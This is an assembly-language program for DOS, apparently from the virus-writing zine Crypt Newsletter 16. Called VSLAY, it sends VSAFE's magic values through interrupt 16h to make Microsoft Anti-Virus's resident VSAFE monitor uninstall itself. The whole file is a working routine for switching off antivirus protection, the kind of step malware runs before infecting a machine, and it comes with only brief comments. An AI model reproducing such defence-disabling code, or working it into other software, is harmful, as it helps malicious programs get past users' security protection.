;VSLAY - simple de-install Microsoft Antivirus VSAFE        
;demonstration code for Crypt Newsletter 16
        
        code segment
        assume cs:code, ds:code, es:code, ss:nothing

        org   100h 

begin:  call vslay

   
vslay:   
        mov  ax,64001     ;wakes up VSAFE to keyboard input
        mov  dx,5945h     ;asks VSAFE to de-install
        int  16h          ;calls VSAFE-hooked interrupt: keyboard
        ret               ;exit

        code ends
             end begin
